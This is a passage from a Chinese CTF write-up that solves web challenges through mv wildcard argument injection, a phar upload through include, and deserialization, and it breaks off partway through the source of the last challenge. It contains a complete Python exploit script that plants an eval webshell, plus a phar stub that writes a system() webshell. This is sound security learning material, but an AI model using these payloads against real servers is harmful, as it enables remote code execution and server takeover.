<p>这里通过exec函数执行了几条shell命令，从<code>/tmp/upload/</code>目录调用<code>mv *</code>将当前目录的文件全部move到<code>/var/www/html/upload/</code>，但是<code>mv *</code>这种带通配符的用法容易发生参数注入问题</p>
<p>mv会将所有的<code>-</code>开头的参数识别成mv的选项</p>
<p>例如临时目录下有这些文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/tmp/upload/</span><br><span class="line">├── -t</span><br><span class="line">├── /etc/passwd</span><br><span class="line">└── normal.txt</span><br></pre></td></tr></table></figure>

<p>执行命令的时候</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp/upload/ ; mv * /<span class="keyword">var</span>/www/html/upload/</span><br></pre></td></tr></table></figure>

<p>但是实际展开的时候就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp/upload/ ; mv -t /etc/passwd normal.txt /<span class="keyword">var</span>/www/html/upload/</span><br></pre></td></tr></table></figure>



<p>我们看看mv的参数有哪些</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/# <span class="built_in">mv</span> --<span class="built_in">help</span></span><br><span class="line">Usage: <span class="built_in">mv</span> [OPTION]... [-T] SOURCE DEST</span><br><span class="line">  or:  <span class="built_in">mv</span> [OPTION]... SOURCE... DIRECTORY</span><br><span class="line">  or:  <span class="built_in">mv</span> [OPTION]... -t DIRECTORY SOURCE...</span><br><span class="line">Rename SOURCE to DEST, or move SOURCE(s) to DIRECTORY.</span><br><span class="line"></span><br><span class="line">Mandatory arguments to long options are mandatory <span class="keyword">for</span> short options too.</span><br><span class="line">      --backup[=CONTROL]       make a backup of each existing destination file</span><br><span class="line">  -b                           like --backup but does not accept an argument</span><br><span class="line">  -f, --force                  <span class="keyword">do</span> not prompt before overwriting</span><br><span class="line">  -i, --interactive            prompt before overwrite</span><br><span class="line">  -n, --no-clobber             <span class="keyword">do</span> not overwrite an existing file</span><br><span class="line">If you specify more than one of -i, -f, -n, only the final one takes effect.</span><br><span class="line">      --strip-trailing-slashes  remove any trailing slashes from each SOURCE</span><br><span class="line">                                 argument</span><br><span class="line">  -S, --suffix=SUFFIX          override the usual backup suffix</span><br><span class="line">  -t, --target-directory=DIRECTORY  move all SOURCE arguments into DIRECTORY</span><br><span class="line">  -T, --no-target-directory    treat DEST as a normal file</span><br><span class="line">  -u, --update                 move only when the SOURCE file is newer</span><br><span class="line">                                 than the destination file or when the</span><br><span class="line">                                 destination file is missing</span><br><span class="line">  -v, --verbose                explain what is being <span class="keyword">done</span></span><br><span class="line">  -Z, --context                <span class="built_in">set</span> SELinux security context of destination</span><br><span class="line">                                 file to default <span class="built_in">type</span></span><br><span class="line">      --<span class="built_in">help</span>     display this <span class="built_in">help</span> and <span class="built_in">exit</span></span><br><span class="line">      --version  output version information and <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">The backup suffix is <span class="string">&#x27;~&#x27;</span>, unless <span class="built_in">set</span> with --suffix or SIMPLE_BACKUP_SUFFIX.</span><br><span class="line">The version control method may be selected via the --backup option or through</span><br><span class="line">the VERSION_CONTROL environment variable.  Here are the values:</span><br><span class="line"></span><br><span class="line">  none, off       never make backups (even <span class="keyword">if</span> --backup is given)</span><br><span class="line">  numbered, t     make numbered backups</span><br><span class="line">  existing, nil   numbered <span class="keyword">if</span> numbered backups exist, simple otherwise</span><br><span class="line">  simple, never   always make simple backups</span><br><span class="line"></span><br><span class="line">GNU coreutils online <span class="built_in">help</span>: &lt;https://www.gnu.org/software/coreutils/&gt;</span><br><span class="line">Full documentation &lt;https://www.gnu.org/software/coreutils/mv&gt;</span><br><span class="line">or available locally via: info <span class="string">&#x27;(coreutils) mv invocation&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>-b</code>参数会在移动操作之前创建一个带<code>~</code>的备份文件，例如当前目录下有一个index.php文件，但是如果我们从别的目录mv过来一个同名文件，那么原来的index.php就会改名为<code>index.php~</code></p>
<p>同时借助<code>--suffix</code>参数可以指定任意文件后缀</p>
<p>那么我们这里的解题思路就可以是</p>
<ol>
<li>上传一个恶意木马文件<code>shell.</code>并触发移动</li>
<li>再上传 <code>shell.</code>，<code>-b</code>，<code>--suffix=php</code>并触发移动，此时就会触发参数注入生成shell.php</li>
<li>利用恶意木马文件进行RCE</li>
</ol>
<p>最终脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.imxbt.cn:30173&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>(<span class="params">filename, content</span>):</span><br><span class="line">    upload_files = &#123;</span><br><span class="line">        <span class="string">&quot;files[]&quot;</span> : (filename, content, <span class="string">&quot;application/octet-stream&quot;</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;upload&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r1 = requests.post(url = url, files = upload_files, data = data)</span><br><span class="line">    <span class="keyword">return</span> r1.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move_file</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;confirm_move&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r2 = requests.post(url = url, data = data)</span><br><span class="line">    <span class="keyword">return</span> r2.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload_file(<span class="string">&quot;shell.&quot;</span>,<span class="string">b&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>)</span><br><span class="line">    move_file()</span><br><span class="line"></span><br><span class="line">    upload_file(<span class="string">&quot;shell.&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">    upload_file(<span class="string">&quot;-b&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">    upload_file(<span class="string">&quot;--suffix=php&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">    move_file()</span><br><span class="line"></span><br><span class="line">    res = requests.post(url+<span class="string">&quot;/upload/shell.php&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<h1 id="include-upload"><a href="#include-upload" class="headerlink" title="include_upload"></a>include_upload</h1><h2 id="phar文件上传"><a href="#phar文件上传" class="headerlink" title="#phar文件上传"></a>#phar文件上传</h2><p>在源代码里面找到一个提示</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 我把include.php删了--&gt;</span></span><br></pre></td></tr></table></figure>

<p>还是选择相信一手，访问include.php发现确实是存在的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">4</span>)) == <span class="string">&quot;.png&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span><span class="string">&#x27;./upload/&#x27;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">我还以为你真信</span><br><span class="line">我还以为你真信</span><br></pre></td></tr></table></figure>

<p>上传了一个png文件后发现一直绕不过去那个Waf，对文件内容有过滤了，过滤了<code>&lt;?</code>和<code>php</code></p>
<p>既然对文件内容有过滤的话，其实还有一个方法就是打phar文件上传</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;poc.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$stub</span> = <span class="string">&lt;&lt;&lt;&#x27;STUB&#x27;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">system(&#x27;echo &quot;&lt;?php system(\$_GET[1]); ?&gt;&quot; &gt; 1.php&#x27;);</span></span><br><span class="line"><span class="string">__HALT_COMPILER();</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">STUB</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="variable">$stub</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">gzopen</span>(<span class="string">&quot;poc.phar.gz&quot;</span>, <span class="string">&#x27;w9&#x27;</span>); <span class="comment">#压缩为gz绕过过滤</span></span><br><span class="line"><span class="title function_ invoke__">gzwrite</span>(<span class="variable">$fp</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;poc.phar&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">gzclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>修改后缀名后上传并利用include触发phar解析，随后访问1.php并进行命令执行就行了</p>
<h1 id="双生序列"><a href="#双生序列" class="headerlink" title="双生序列"></a>双生序列</h1><h2 id="pickle反序列化-php反序列化写入文件"><a href="#pickle反序列化-php反序列化写入文件" class="headerlink" title="#pickle反序列化+php反序列化写入文件"></a>#pickle反序列化+php反序列化写入文件</h2><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;classes.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$shark</span> = <span class="string">&quot;blueshark:&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&quot;s&quot;</span>] ?? <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">str_starts_with</span>(<span class="variable">$s</span>, <span class="variable">$shark</span>)) &#123;</span><br><span class="line">        <span class="variable">$ss</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$shark</span>));</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO notes (content) VALUES (?)&quot;</span>);</span><br><span class="line">        <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$ss</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;save sucess&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$q</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id, content FROM notes ORDER BY id DESC LIMIT 10&quot;</span>);</span><br><span class="line"><span class="variable">$rows</span> = <span class="variable">$q</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>少了一个反序列化的操作，但其实跟之前的没啥区别</p>
<p>api.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;classes.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cat</span> = <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>] ?? <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>)) &#123;</span><br><span class="line">    <span class="variable">$cat</span>-&gt;<span class="title function_ invoke__">OwO</span>();</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT content FROM notes WHERE id = ?&quot;</span>);</span><br><span class="line"><span class="variable">$s</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$id</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$s</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="variable">$cat</span>-&gt;<span class="title function_ invoke__">OwO</span>();</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$allowed</span> = [<span class="string">&quot;Writer&quot;</span>, <span class="string">&quot;Shark&quot;</span>, <span class="string">&quot;Bridge&quot;</span>];</span><br><span class="line"><span class="variable">$o</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>], [<span class="string">&quot;allowed_classes&quot;</span> =&gt; <span class="variable">$allowed</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$o</span> <span class="keyword">instanceof</span> Bridge)) &#123;</span><br><span class="line">    <span class="variable">$cat</span>-&gt;<span class="title function_ invoke__">OwO</span>();</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$o</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$r</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有一个白名单并且序列化字符串中必须有Bridge</p>
<p>run.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./classes.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> !== <span class="string">&quot;run&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$binfile</span> = <span class="string">&quot;/tmp/ssxl/run.bin&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$binfile</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$binfile</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$allowed</span> = [<span class="string">&quot;Pytools&quot;</span>];</span><br><span class="line"><span class="variable">$exec</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>, [<span class="string">&quot;allowed_classes&quot;</span> =&gt; <span class="variable">$allowed</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_object</span>(<span class="variable">$exec</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_class</span>(<span class="variable">$exec</span>) !== <span class="string">&quot;Pytools&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$exec</span>, <span class="string">&quot;__call&quot;</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$exec</span>-&gt;<span class="title function_ invoke__">blueshark</span>();</span><br><span class="line">        <span class="variable">$out</span> = <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$out</span> !== <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$out</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$ret</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>还有一个反序列化操作，但是这里的话只能反序列化<code>Pytools</code>类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$exec</span>, <span class="string">&quot;__call&quot;</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$exec</span>-&gt;<span class="title function_ invoke__">blueshark</span>();</span><br><span class="line">        <span class="variable">$out</span> = <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$out</span> !== <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$out</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$ret</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果反序列化出来的对象中有定义<code>__call</code>方法，就会主动触发他，并主动分别输出<code>__call</code>里的echo以及return返回值</p>
<p>classes.php\Pytools</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pytools</span> <span class="keyword">extends</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span> = False;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logbuf</span> = <span class="string">&quot;看看你都干了什么好事喵！&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cmd</span> = 